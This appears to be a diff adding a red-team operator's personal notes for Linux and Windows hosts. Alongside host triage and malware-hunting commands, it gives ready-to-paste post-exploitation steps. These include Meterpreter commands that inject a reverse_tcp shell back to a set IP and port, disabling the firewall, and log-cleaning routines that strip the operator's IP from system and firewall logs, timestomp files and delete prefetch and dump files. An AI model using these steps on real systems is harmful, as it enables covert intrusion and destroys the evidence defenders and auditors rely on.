+for user in $(cut -f1 -d: /etc/passwd);do echo -n "$user "; crontab -u $user -l; done
+
+#Init MT 
+cat /etc/inittab 
+egrep -Rin "python|bash|ruby|perl" /usr/lib/systemd/system /lib/systemd/system /etc/systemd/system /run/systemd/system | grep -i start 
+egrep -Rin "python|bash|ruby|perl" /etc/init*
+find /usr/lib/systemd/system /lib/systemd/system /etc/systemd/system /run/systemd/system -type f -printf "%T@ %Tc %p\n" | sort -n
+find /etc/init* -type f -printf "%T@ %Tc %p\n" | sort -n | tail -n 10 
+find /home /root /export -type f -name "*rc" -size +0	
+find /home /root /export -type f -name "*profile" -size +0
+
+#EZ-Wins MT 
+systemctl list-sockets
+lsof | awk '$10~/.*libpcap.*|.*socketmod.*/{print $0}'
+lsof | awk '$4~/w/ && $5~/REG/ && $9!~/^.dev|^.proc|^.run/{print $0}'
+for i in $(ps -eo pid,cmd --no-header | awk '$2!~/^\[.*\]$/{print $1}'); do man -f $(cat /proc/$i/comm);done | grep "nothing appropriate"
+
+#Fundamentals MT
+netstat -natup 
+ps -eo user,pid,ppid,vsz,tty,time,comm,cmd --sort start_time | awk '$4 != "0"'
+
+#Cron Check 
+find / -not -path "/proc/*" -not -path "/sys/*" -not -path "/run/*"-type f -mmin 20
+
+}}} #
+		{{{ #Malware Prosecution
+			$ find / -name "*yeet*"
+			$ lsof -p 3232
+			$ stat /root/yeet.exe 
+			$ file /root/yeet.exe 
+			$ strings /root/yeet.exe 
+			$ download /root/yeet.exe 
+			$ find / -type f -newermt "2017-12-20 08:52:55" \! -newermt "2017-12-20 09:52:55" 2>/dev/null #half hour -+
+			$ find / \( -path /proc -prune -o -path /sys -prune \) -o -cnewer /dev/start -type f 
+			{{{ #Class Notes
+				- Checklist 
+					- lsof 
+						- CWD
+					- netstat
+					- logs 
+					- time correlation
+					- disk checks 
+					- is md5sum nc?
+				> Identify Charachteristics:
+					- Odd Name?
+					- Unusual Arguments?
+					- Where is it on Disk?
+						- Start From Unexpected Location? 
+					- Start Sooner than Expected?
+					- Unexpected Ancestors?
+					- Run by odd user?
+					- What is it doing?
+						- Open FDs
+						- Open Sockets
+						- Strings 
+						- Google
+				> Network Capabilities: 
+					- Outbound Connections
+					- Listening Locally
+					- Established Connections
+						- Ex-Fil?
+						- Recieving Instructions?
+					- Strings (network system calls)
+						- "INET"
+						- "AF"
+						- "SOCK"
+				> Assosiated Files:
+					$ find / -name "*yeet*"
+					$ ls -latRi /usr/ | sort -n -k 1 | tail -n 10 		#Search for oddly high inode 
+					- Created/Modified around same time 
+						- Files 
+							$ stat /usr/bin/yeet 
+							$ find / -type f -newermt "2017-12-20 08:52:55" \! -newermt "2017-12-20 09:52:55" 2>/dev/null #half hour -+
+							$ find / \( -path /proc -prune -o -path /sys -prune \) -o -cnewer /dev/start -type f 
+						- Users Involved (last login)
+						- Logs 
+							- Install Logs
+							- History files
+							- IPaddresses (iptables log, last log)
+					- Logging to disk?
+					- Configuration files (C2)
+				> Persistance Method:
+					- Userspace (userspace pid)
+					- Cron
+					- Started at user login?
+					- How does it start (Parent Process)
+
+			}}} #
+		
+		}}} #
+		{{{ #Disco 
+#Correct Loaded Modules PD 
+diff <(echo "`lsmod | grep iptable`") <(echo "$ogtables")
+rmmod $(diff <(echo "`lsmod | grep iptable`") <(echo "$ogtables") | egrep "^<" | awk '$2~iptable_.*/{print $2}')
+diff <(echo "`lsmod | grep iptable`") <(echo "$ogtables")
+
+#LogClean PD		
+mkdir /tmp/yeet && cd /tmp/yeet 
+egrep -nl "$yeetIP|Successful su for|/bin/su" `find / -not -path "/proc/*" -not -path "/sys/*" -not -path "/run/*" -type f -size +0b -mmin -360 | xargs` | tee >(awk -F ":" '{print $1}' | sort | uniq | xargs)
+cp /tmp/yeet 
+file * 
+- Clean file (vi, sed, grep)
+cat /tmp/yeet.clean > /var/log/yeet.log 
+tail -n1 /var/log/yeet.log 
+touch -t YYYYMMDDHHMM.SS /var/log/filename 
+		
+#Pre-Final 
+comm -23 <(echo "`find /home /root /tmp /var/log`") <(echo "$yeetDirs") 2>/dev/null 
+cd / && rm -rf /tmp/yeet
+ls -lah /tmp/ 
+cd /tmp && echo -e '#!/bin/sh\nsleep 20\nfunction d {\nservice auditd start; rm -rf /tmp/X-unix\n}\ntrap d EXIT' > X-unix && chmod 755 X-unix && cat X-unix && ./X-unix&
+		
+#Final 
+exit 
+
+		}}} #
+
+
+
+		
+		{{{ #Triage
+			{{{ #Initial
+				- SA
+					$ unset HISTFILE
+					$ script /dev/shm/trans
+					$ touch /dev/shm/start 
+					$ ip a 		#ifconfig -a 
+					$ hostname
+					$ w
+					$ whoami && id 
+					$ date && date -u
+					$ env 
+					$ sestatus
+					
+				- System Charachterization 
+					$ uname -a && cat /etc/*elease*
+					- Get init system 
+						$ compgen -c | egrep "^service$|^chkconfig$|^initctl$|^update-rc.d$|^systemctl$|^svcs$" | sort -u
+						$ man -f init 
+						$ netstat -natup
+					 
+					- Hardware
+						$ uptime
+						$ cat /proc/cpuinfo #Solaris $ psrinfo -v
+						$ vmstat
+						$ df -h 	#Hard Drive utilization 
+						$ df -i 	#Inode Utilization
+					- Users 
+						- Users that can login 
+							$ for acc in `getent passwd | egrep ".*sh$" | cut -d ':' -f1`;do getent shadow $acc;done | awk -F ":" '$2!~/^\*|^!|^$/{print $0}' 
+						
+			}}} #
+			{{{	#Networking 
+				$ netstat -natup	#Solaris $ netstat -anP tcp && netstat -anP udp 	$ cd /proc; for p in `find * -type d -prune`; do pfiles $p | grep port >> /tmp/ports && echo PID: $p /tmp/ports;done 
+				$ ss -natup 
+				$ lsof -i 
+				$ lsof -nP -i 
+				$ systemctl list-sockets
+				$ netstat -rn 
+				$ arp -an 			#?arp -v 
+
+			}}} #
+			{{{ #Process Checks 
+				- Initial (name, arguments, locations)
+					$ ps -eo comm,cmd 
+				- Secondary (Network Connections, Start order/time, Users, Parents)  
+					$ ps -ef --sort start_time | awk '$8!~/^\[.*\]$/{print $0}'	# ps auxwww		#Solaris $ ptree && ps -ef 
+				- Process Masquerading Check
+					$ ps -eo user,pid,ppid,vsz,tty,comm,cmd --sort start_time | awk '$4 != "0"'
+				- Man page Check 
+					$ ps -eo cmd | awk '$1~/^\//{print $1}' | while read line;do echo $line | man -f `awk -F "/" '{print $NF}'`; done 2>&1 | grep "nothing appropriate"
+				- Process Ran by uses with login shells 
+					$ ps -eo user,pid,ppid,vsz,tty,comm,cmd --sort start_time | awk '$4 != "0"' | egrep `cat /etc/passwd | egrep "*.sh$" | awk -F ":" '{ORS="|"};{print $1};' | sed 's/.$//'`
+
+			}}} #
+			{{{ #Disk Checks
+				- General Dirs 
+					- Glance
+						$ ls -latr / /tmp /home/* /var /tmp /opt /root/* | less
+						$ find /home /root /export -type f -name "*history" -size +0 2>/dev/null
+					- Binaries/Scripts in Odd locations 
+						$ find /tmp /var /home /media /mnt -maxdepth 4 -type f -exec file \{\} \; | egrep 'SB| ASCII text executable'	
+				- Persistance 
+					- Cron 
+						- System Cron Tables 
+							$ cat /etc/crontab /etc/anacrontab /etc/attab
+						- System Cron Jobs 
+							$ cat `ls -latrd /etc/cron* /etc/sysconfig/cron* | awk '$1!~/^d.*/{print $9}' | xargs` | less 
+						- User Cron Jobs 
+							$ ls -latr /var/spool/{cron,at,anacron}/* 2>/dev/null
+						- User Cron Tables  
+							$ for user in $(cut -f1 -d: /etc/passwd); do echo $user >> /tmp/crontabs; crontab -u $user -l >> /tmp/crontabs; done
+					- Init Files 
+						- All
+							$ cat /etc/inittab
+						- SystemD odd unit files 
+							$ egrep -Rin "python|bash|ruby|perl" /usr/lib/systemd/system /lib/systemd/system /etc/systemd/system /run/systemd/system | grep -i start 
+							$ egrep -Rin "python|bash|ruby|perl" /etc/init*
+							$ find /usr/lib/systemd/system /lib/systemd/system /etc/systemd/system /run/systemd/system -type f -printf "%T@ %Tc %p\n" | sort -n
+						- SystemV odd rc scripts check 
+							$ egrep -Rin "python|bash|ruby|perl" /etc/init*
+							$ find /etc/init* -type f -printf "%T@ %Tc %p\n" | sort -n
+						- Upstart odd conf files 
+							$ egrep -Rin "python|bash|ruby|perl" /etc/init*			
+							$ find /etc/init* -type f -printf "%T@ %Tc %p\n" | sort -n
+					- Login Scripts
+						- rc 
+							$ find /home /root /export -type f -name "*rc" -size +0	
+							- Diff with skel
+								$ for prof in `find /home /root /export -type f -name ".*rc" 2>/dev/null -print0 | xargs -0`;do echo $prof && diff -q $prof /etc/skel/.bashrc ;done
+						- profile 
+							$ find /home /root /export -type f -name "*profile" -size +0
+							- Diff with skel 
+								$ for prof in `find /home /root /export -type f -name ".*profile" 2>/dev/null -print0 | xargs -0`;do echo $prof && diff -q $prof /etc/skel/.bash_profile ;done	
+					- Package Consistencty
+						- APT 
+							$ for b in /bin /sbin /usr/bin /usr/sbin /usr/local/bin /usr/local/sbin; do for i in $(ls -l $b | grep -v /etc/alt | awk '{print $9}'); do /usr/bin/printf "$i = $(dpkg -S $b/$i)"; done; done | grep "no path found"
+						- RPM
+							$ for b in /bin /sbin /usr/bin /usr/sbin /usr/local/bin /usr/local/sbin; do for i in $(ls $b/); do printf "$i = $(rpm -qf $b/$i)\n"; done; done | grep "not owned by any package" 
+							
+			}}} #
+			{{{ #logging 
+				$ last -i 
+				- Check logging locations for keylogger network sniffing inidcators. 
+			
+			}}} #
+			{{{ #Disco 
+				- Get files changed since login
+					$ find / \( -path /proc -prune -o -path /sys -prune \) -o -mmin -14 -type f -print0 | xargs -0 ls -latr 
+				- Get Time on box
+					$ touch /dev/shm/end 
+					$ secs=$(echo `stat -c%Y /dev/shm/end` - `stat -c%Y /dev/shm/start` | bc) && printf '%dh:dm:%ds\n' $((secs/3600)) $((secs%3600/60)) $((secs%60))
+
+			}}} #
+			
+		}}} #
+
+	}}} #
+	{{{ #Windows Operating
+		{{{ #FAQ
+			{{{ #Get Hashes
+				- Get hash
+					$ certutil -hashfile "file.png" MD5							#Hash a file 
+					$ powershell, get-filehash -algorithm SHA256 -path C:\file.txt -recurse	
+					$ for %F in (*) do @certutil -hashfile "%F" MD5				#Hash all Files in dir 
+					
+			}}} #
+			- Windows executables often have identical installdate,creationdate,lastaccessed  <times
+				- This is because they were all installed together. NOT weird 
+			- Is it a VM?
+				- vmtoolsd.exe = VM
+				- HardwareAddress = 00:50:56 = VM 
+			- What is the domain name/hostname/ip?
+				- nbtstat -rn
+				- reg query hklm\system\currentcontrolset\services\tcpip\parameters
+				- systeminfo (if systeminfo and the reg key don't match, its just a workgroup)
+			- Are there persistant routes?
+				$ netstat -rn
+			- what is the system uptime?
+				- smss Elapsed time (pslist)
+			- Users that Have Logged on
+				$ reg query HKLM\System\CurrentControlSet\Control\Hivelist
+			- Should svchost be run after a login?
+				- no
+			- Get Last User to Log ON
+				$ reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Authentication\LogonUI"
+			- Get Currently Logged In Users	
+				$ Reg query hku
+				$ reg query "hklm\software\microsoft\windows nt\currentversion\profilelist"
+				$ wmic computersystem get username
+			- Get zone bias
+				- Only Eventlogs are kept in UTC.
+				$ w32tm /tz
+				$ reg query HKLM\SYSTEM\CurrentControlSet\Control\TimeZoneInformation
+				$ Get-ChildItem C:\Users\Andrew\.frostwire5\cmd.dll | select CreationTimeUTC
+			- Get Telnet autoruns 
+				$ reg query hklu\software\microsoft\telnetserver\1.0
+			- Get Potential Web Roots 
+				$ cscript c:\inetpub\adminscripts\adsutil.vbs FIND Path
+			- Processes spawned via scheduled tasks usually show up as children of **taskeng.exe** or **svchost -k netsvcs -p -s Schedule**
+					
+		}}} #
+		{{{ #My SA
+			- Annotate Time 
+				$ localtime
+			- Verify IP 
+				$ ipconfig 
+			- Arch Migrate 
+				$ run post/windows/manage/archmigrate IGNORE_SYSTEM=true
+			- Get Second Shell 
+				$ run post/windows/manage/multi_meterpreter_inject IPLIST=172.17.10.80 LPORT=32032 HANDLER=true PAYLOAD=windows/x64/meterpreter/reverse_tcp
+				{{{ #Old SA (Which I like better) 
+					- SA
+						$ ipconfig /all 
+						$ w32tm /tz && date /t && time /t
+						$ reg query hklm\system\currentcontrolset\control\timezoneinformation	#Active time bias TIME-+OFFSET=UTC 
+						$ systeminfo
+						$ reg query hklm\system\currentcontrolset\control\windows
+					
+					- Get Logging Info
+						$ auditpol /get /category:*
+						$ wevtutil qe security /q:"*[System/EventID=4625]" /C:50 /rd:true #Failed Login (Newest First)
+						$ wevtutil qe security /q:"*[System/EventID=4624]" /C:70 /rd:true #Succesful Login
+						$ wevtutil qe security /q:"*[System/EventID=4625]" /C:1 /rd:False | findstr -in Administrator #Failed Login (Oldest First)
+					
+					
+					- Get user info 
+						$ wmic computersystem get username		#Currently Logged on Users
+						$ wmic useraccount get name,SID         #All Users
+						$ reg query hklm\system\currentcontrolset\control\hivelist	#Users that HAVE logged on 
+						
+					- get process info 
+						$ wmic process get description,processId,parentprocessid
+						$ wmic process get description,processId,executablepath	
+						$ wmic process get description,processId,commandline
+
+					- get system info 
+						$ systeminfo 
+						$ wmic os get osarchitecture,ServicePackMajorVersion,ServicePackMinorVersion,Version,name
+					
+					- Find Installed Programs
+						$ reg query hklm\software
+						$ reg query HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall
+						$ reg query HKEY_LOCAL_MACHINE\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall
+						$ reg query HKCU:\Software\Microsoft\Windows\CurrentVersion\Uninstall
+						
+					- Find Security Products
+						$ wmic /node:localhost /namespace:\\root\securitycenter2 path antivirusproduct
+				$ wmic process get name,executablepath
+
+				}}} #
+
+		}}} #
+		{{{ #Survey 
+		```O
+		localtime 
+		ipconfig
+		sysinfo
+		run multicommand -cl 'cmd /c systeminfo'
+		getpid
+		getuid
+		pwd
+		run multicommand -cl 'whoami /priv'
+		run post/windows/gather/wmic_command COMMAND="computersystem get TotalPhysicalMemory"
+		run post/windows/gather/wmic_command COMMAND="OS get FreePhysicalMemory"
+		run multicommand -cl 'netsh interface ip show config'
+		route
+		ps
+		run post/windows/gather/enum_services
+		netstat
+		run post/windows/gather/enum_logged_on_users
+		idletime
+		run multicommand -cl 'schtasks /query'
+		run post/windows/gather/enum_applications
+		run getcountermeasure
+		run post/multi/gather/env
+		show_mount
+		run multicommand -cl 'net share'
+		reg enumkey -k 'HKU\.Default'
+		run multicommand -cl 'net users'
+		run multicommand -cl 'net localgroup administrators'
+		run multicommand -cl 'net accounts'
+		search -f *.pdf
+		run multicommand -cl 'cmd /c dir c:\\*.log /S /A /od /tw'
+		reg queryval -k 'HKLM\software\microsoft\powershell\1\powershellengine' -v powershellversion
+		cd c:/windows/prefetch 
+		run multicommand -cl "cmd.exe /c dir /A /o:d /t:w"
+		run event_manager -l security 
+		run event_manager -l system  
+		run event_manager -l application 
+		run multicommand -cl 'auditpol /get /category:*'
+		search -f *.wer
+		```C
+
+		}}} #
+		{{{ #Triage
+			- SUS Process Check
+				$ netstat #OR $ netstat -ano	# OR $ wmic process get description,processID	
+					- Lookin for processes with odd/unexpected ports 
+				$ ps # OR $ tasklist /v 
+					- Lookin for Odd Binaries, Odd arguments <In that order 
+					- Lookin for Odd Locations
+					- Lookin for svchost started after a login (Or other qwerky Parent/Child relationships)
+					- svchost wrong arch
+					- svchost nt authority system with socket
+					- Lookin for weird process owners (processes running in weird sessions)
+					- qwerky process relationships
+				$ tasklist /svc 
+			- Persistance Check
+				$ wmic startup
+				$ schtasks | findstr -i running							#Test for Size
+				$ schtasks | findstr -i ready							#Test for Size
+				$ C:\windows\system32\aurorunsc -lm -accepteula > C:\ar_m.txt 	#This may be the one
+				$ C:\windows\system32\aurorunsc -bm -accepteula > C:\ar_l.txt
+				$ C:\windows\system32\aurorunsc -tm -accepteula > C:\ar_b.txt
+				$ C:\windows\system32\aurorunsc -dm -accepteula
+			- EZ-Wins 
+				- Non-Standard Name
+					$ wmic process get name | findstr /vr "ApplicationFrameHost.exe GoogleCrashHandler.exe GoogleCrashHandler64.exe Memory Compression MsMpEng.exe NisSrv.exe Registry RuntimeBroker.exe SearchApp.exe SearchIndexer.exe SecurityHealthService.exe SecurityHealthSystray.exe SettingSyncHost.exe SgrmBroker.exe ShellExperienceHost.exe StartMenuExperienceHost.exe System System Idle Process SystemSettings.exe TextInputHost.exe UserOOBEBroker.exe VGAuthService.exe WMIC.exe WmiPrvSE.exe YourPhone.exe cmd.exe conhost.exe csrss.exe ctfmon.exe dllhost.exe dwm.exe explorer.exe fontdrvhost.exe lsass.exe msdtc.exe services.exe sihost.exe smss.exe spoolsv.exe svchost.exe taskhostw.exe vm3dservice.exe vmtoolsd.exe vpnagent.exe vpnui.exe wininit.exe winlogon.exe findstr.exe SearchProtocolHost.exe SearchFilterHost.exe"
+				- Non-Standard ExecutablePath
+					$ wmic process get ExecutablePath | findstr /vir "C:\\WINDOWS\\Explorer.EXE C:\\WINDOWS\\System32\\Wbem\\WMIC.exe C:\\WINDOWS\\System32\\svchost.exe C:\\WINDOWS\\system32\\ApplicationFrameHost.exe C:\\WINDOWS\\system32\\SettingSyncHost.exe C:\\WINDOWS\\system32\\cmd.exe C:\\WINDOWS\\system32\\conhost.exe C:\\WINDOWS\\system32\\sihost.exe C:\\WINDOWS\\system32\\svchost.exe C:\\WINDOWS\\system32\\taskhostw.exe C:\\Windows\\System32\\RuntimeBroker.exe C:\\Windows\\System32\\SecurityHealthSystray.exe C:\\Windows\\System32\\oobe\\UserOOBEBroker.exe C:\\Windows\\System32\\smartscreen.exe"
+				- Networking Dlls
+					$ tasklist /m WinInet.dll
+			- Reg key Check
+				- Mandatories
+			- Drivers 
+				#$ run multicommand -cl "cmd /c dir c:\\windows\\system32\\drivers /od /tw"
+				#$ run multicommand -cl "cmd /c dir c:\\windows\\syswow64\\drivers /od /tw"		
+				$ run uploadexec -e /root/sigcheck -u C:\\windows\\system32\\drivers > C:\\windows\\temp\\sigcheck.txt	#Dir Check
+
+			
+		}}} #
+		{{{ #Prosecution
+			- Verify SUS
+				{{{ #Assosiated Equals
+					- Malware
+					- Part of Malware (Persistance)
+					- Written To
+					- Created By 
+					
+				}}} #
+				- Files in same Location 
+					$ dir c:\\yeet\
+				- Identical Size 
+					$ dir  C:\yeet.exe /-c 		#Get Bytes
+					$ dir  C:\* /s /-c | findstr "Bytes"
+				- Similar timestamp 
+					$ dir /tc c:\yeet.exe
+					$ dir c:\* /s /T:W  | findstr -r "DD/MM/YYYY.*HH:MM AM"  	#Modified	(20 minutes)
+					$ dir c:\* /s /T:C  | findstr -r "DD/MM/YYYY.*HH:MM AM" 	#Created	(1 Minute)
+				- Open Handles 
+					$ upload /root/Resources/sysinternals/handle.exe C:\\windows\\temp\\mscupd\\handle.exe
+					$ run multicommand -cl "cmd /c handle.exe -a /accepteula > c:/windows/temp/handles.txt"
+					#$ handle -p 3232
+				- Non-Standard DLL's
+					$ tasklist /M /FI "PID eq 3232"
+					$ listdlls -u 3232
+				- RegFind
+					$ upload /root/Resources/sysinternals/regfind.exe C:\\windows\\temp\\mscupd\\regfind.exe
+					$ regfind.exe -i 2 -y "yeet.exe"
+				- Download Memdump
+					$ run process_memdump -p 3232
+						$ strings YEET | egrep "FtpGetFile|HttpSendRequest|([0-9]{1,3})\.([0-9]{1,3})\.([0-9]{1,3})\.([0-9]{1,3})"
+						$ strings YEET | egrep "metsrv"
+				- Download File 
+					$ C:\\windows\\yeet.exe /tmp/yeet.ex_
+					$ strings YEET | egrep "FtpGetFile|HttpSendRequest|([0-9]{1,3})\.([0-9]{1,3})\.([0-9]{1,3})\.([0-9]{1,3})"
+					- Unpack and investigate
+						$ upx -d server.exe -o server.exe.uncomp
+						$ hexeditor server.exe.uncomp
+				- Others?
+					$ sc queryex state=all | findstr "Yeet.exe"
+					
+					
+		}}} #
+		{{{ #Log Cleaning
+		- Use Your Tools!!
+		{{{ #Error Reporting 
+			- Older than Vista
+			$ shell 
+				$ dir C:\*.*dmp /s | find /i "dmp" | sort /r	#Locate dump files
+					$ run multicommand -cl "cmd /c dir /s c:\\*.*dmp | find \"dmp\" | sort /r"
+				$ dir C:\*.*wer /s | find /i "wer" | sort /r
+					$ run multicommand -cl "cmd /c dir /s c:\\*.*wer | find \"wer\" | sort /r"
+				$ cd yeet
+				$ dir
+				$ del *.dmp *.hdmp *.mdmp *.wer		#rm if they were changed while you were on target #.dmp=older than vista
+		}}} #
+		{{{ #Firewall 
+			$ run getcountermeasure 
+			$ shell 
+				$ wmic os get localdatetime
+				$ netsh firewall show logging 					#Get File Location XP
+				$ netsh advfirewall show allprofiles			#Get File Location Vista+						
+				$ dir  C:\windows\pfirewall.log 				#Get Log Update Time 
+				$ findstr /R "1.1.1.1" C:\windows\pfirewall.log	#Get My Entries
+				$ findstr /V /R "1.1.1.1.*32032" C:\windows\pfirewall.log  > C:\windows\temp\sd_102.tmp 	#Remove Entries
+				$ findstr "1.1.1.1" C:\windows\temp\sd_102.tmp	#Verify Cleanlyness
+				$ netsh firewall set opmode disable				#Stop Firewall Service 
+				$ move C:\windows\temp\sd_102.tmp C:\windows\pfirewall.log 		#Overwrite log 
+				$ type C:\windows\pfirewall.log | find /c /v ""	#Get wc -l 
+				$ more C:\windows\pfirewall.log +1087				#Get Last Line (#=wc -l -1) write time 
+				$exit 
+			$ timestomp c:\\windows\\pfirewall.log -m "31/12/2015 23:26:02"	#Timestomp
+			$ run multicommand -cl "netsh firewall set opmode enable"		#Restart Firewall 
+			{{{ #Firewall Pasteable
+			```O
+	YEETIP		= 1.1.1.1
+	YEETPORT1 	= 32032
+	YEETPORT2	= 16102
+	LOGFILE 	= C:\\windows\\temp\\sd_102.tmp
+
+	run getcountermeasure 
+	shell 
+
+	wmic os get localdatetime
+	netsh firewall show logging 					
+	netsh advfirewall show allprofiles
+
+	netsh firewall set opmode disable				
+	dir LOGFILE 				
+	findstr /R "YEETIP" LOGFILE 	
+	findstr /V /R "YEETIP.*YEETPORT1" LOGFILE  > C:\windows\temp\sd_32.tmp
+	findstr /V /R "YEETIP.*YEETPORT2" C:\windows\temp\sd_32.tmp > C:\windows\temp\sd_33.tmp
+	findstr "YEETIP" C:\windows\temp\sd_33.tmp	
+		
+	move C:\windows\temp\sd_33.tmp LOGFILE		
+	type LOGFILE | find /c /v ""	
+
+	more LOGFILE +1087				
+
+	exit 
+
+	timestomp LOGFILE -m "31/12/2015 23:26:02"	
+
+	run multicommand -cl "netsh firewall set opmode enable"					
+			
+			```C
+			
+			}}} #
+		
+		}}} #
+		{{{ #Prefetch 
+			$ shell
+				$ cd %SYSTEMROOT%\prefetch
+				$ dir /A /o:d /t:w				#Sort Files by write time 
+				- Pasted block of files (NP++) 	
+				- Tailor down to files you want to delete 
+				$ (\h*\R)+			\x20		#Regex
+				$ del {paste}					#Delete Files 
+				$ cmd.exe /c dir /A /o:d /t:w	#repeat		
+
+		}}} #
+				
+	}}} #
+
+	}}} #
+
+
+}}} ###
+
+
+
+
+
+
+
+
+
+
+
+
